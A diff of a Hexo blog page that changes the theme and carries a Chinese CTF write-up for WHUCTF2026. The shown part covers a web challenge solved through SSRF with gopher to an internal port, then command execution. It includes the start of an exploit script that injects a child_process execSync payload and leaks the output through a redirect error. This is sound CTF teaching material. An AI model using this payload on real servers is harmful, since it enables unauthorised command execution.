@@ -1,90 +1,175 @@
-
-
 <!DOCTYPE html>
-<html lang="en" data-default-color-scheme=auto>
-
-
-
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="blank">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/blank.png">
-  
+                // Try immediately
+                if (addBodyClass()) return;
 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="blank">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="web的部分题解，随着复现进度更新,没标记solved是赛后出的 Hell City[solved]初步测试发现是拼接url访问目的地址 手动探测，发现文件目录，根据这个提示我猜测真正的入口在另一个端口，然后要利用非常一点的协议，根据之前复现熔烬裂谷的经验初步推测是gopher 入口在80端口，协议是gopher,构造payload  入口确认: 可稳定访问 127.0.0.1:80，返回 Nex">
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://b1ank799.github.io/2026/04/29/whuctf2026/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WHUCTF2026">
 <meta property="og:url" content="https://b1ank799.github.io/2026/04/29/WHUCTF2026/index.html">
 <meta property="og:site_name" content="blank">
-<meta property="og:description" content="web的部分题解，随着复现进度更新,没标记solved是赛后出的 Hell City[solved]初步测试发现是拼接url访问目的地址 手动探测，发现文件目录，根据这个提示我猜测真正的入口在另一个端口，然后要利用非常一点的协议，根据之前复现熔烬裂谷的经验初步推测是gopher 入口在80端口，协议是gopher,构造payload  入口确认: 可稳定访问 127.0.0.1:80，返回 Nex">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://b1ank799.github.io/images/redefine-og.webp">
 <meta property="article:published_time" content="2026-04-29T08:06:29.000Z">
 <meta property="article:modified_time" content="2026-05-05T08:34:02.972Z">
 <meta property="article:author" content="blank">
 <meta property="article:tag" content="ctf">
-<meta name="twitter:card" content="summary_large_image">
-  
-  
-  
-  <title>WHUCTF2026 - blank</title>
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://b1ank799.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
+    <meta name="theme-color" content="#8faadc">
+    <link rel="shortcut icon" href="/images/favicon.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            WHUCTF2026 | blank
+        
+    </title>
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
 
 
+    <!--- Inject Part-->
+    
 
-<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
+    
+<link rel="stylesheet" href="/css/style.css">
 
 
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
 
+    
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"b1ank799.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
 
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"b1ank799.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#8faadc","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":false,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background1.png","dark":"/images/background1.png"},"title":"blank","subtitle":{"text":["不知何时醒来"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":null},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"you@example.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"首页":{"path":"/","icon":""},"归档":{"path":"/archives/","icon":""},"分类":{"path":"/categories/","icon":""},"标签":{"path":"/tags/","icon":""},"关于":{"path":"/about/","icon":""}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":false,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":false,"icon":"","start":"2022/8/17 11:45:14","statistics":false,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
 
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
 
-  
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
 <meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
   direction: ltr;
 }
@@ -200,196 +285,395 @@ mjx-container[display="true"] + br {
 </style></head>
 
 
-
 <body>
-  
+	<div class="progress-bar-container">
+	
 
-  <header>
-    
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>blank</strong>
-    </a>
+<main class="page-container" id="swup">
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
+	
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>Home</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>Archives</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/" target="_self">
-                <i class="iconfont icon-category-fill"></i>
-                <span>Categories</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>Tags</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>About</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                blank
+                
             </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="WHUCTF2026"></span>
-          
         </div>
 
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-04-29 16:06" pubdate>
-          April 29, 2026 pm
-        </time>
-      </span>
-    
-  </div>
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
 
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          6.9k words
-        
-      </span>
-    
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
 
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          58 mins
-        
-      </span>
-    
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-    
-    
-  </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    
+                                    首页
+                                    
+                                </a>
 
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-        
-      </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives/"
+                                        >
+                                    
+                                    归档
+                                    
+                                </a>
 
-      
-    </div>
-  </div>
-</div>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-</div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    
+                                    分类
+                                    
+                                </a>
 
-  </header>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-  <main>
-    
-      
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    
+                                    标签
+                                    
+                                </a>
 
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-    </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about/"
+                                        >
+                                    
+                                    关于
+                                    
+                                </a>
 
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">WHUCTF2026</h1>
-            
-            
-              <div class="markdown-body">
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
                 
-                <p>web的部分题解，随着复现进度更新,没标记solved是赛后出的</p>
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives/"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about/"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">WHUCTF2026</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">blank</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-04-29 16:06:29</span>
+        <span class="mobile">2026-04-29 16:06:29</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-05 16:34:02</span>
+            <span class="mobile">2026-05-05 16:34:02</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/wp/">wp</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.1k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>9 Mins</span>
+        </span>
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>web的部分题解，随着复现进度更新,没标记solved是赛后出的</p>
 <h2 id="Hell-City-solved"><a href="#Hell-City-solved" class="headerlink" title="Hell City[solved]"></a>Hell City[solved]</h2><p>初步测试发现是拼接url访问目的地址</p>
 <p>手动探测，发现文件目录，根据这个提示我猜测真正的入口在另一个端口，然后要利用非常一点的协议，根据之前复现熔烬裂谷的经验初步推测是gopher</p>
 <p>入口在80端口，协议是gopher,构造payload</p>
@@ -401,7 +685,7 @@ mjx-container[display="true"] + br {
 <li>命令验证: 先 id 验证 RCE，再改 cat /flag，从 x-action-redirect 解码得到 flag。</li>
 </ol>
 <p>最终exp:执行：<code>python3 gopher.py --cmd "cat /flag"</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_js_payload</span>(<span class="hljs-params">cmd: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-comment"># Use NEXT_REDIRECT digest to exfiltrate command output in response</span><br>    <span class="hljs-keyword">return</span> (<br>        <span class="hljs-string">"var o=process.mainModule.require('child_process').execSync("</span><br>        + json.dumps(cmd)<br>        + <span class="hljs-string">").toString().trim();"</span><br>          <span class="hljs-string">"throw Object.assign(new Error('NEXT_REDIRECT'),"</span><br>          <span 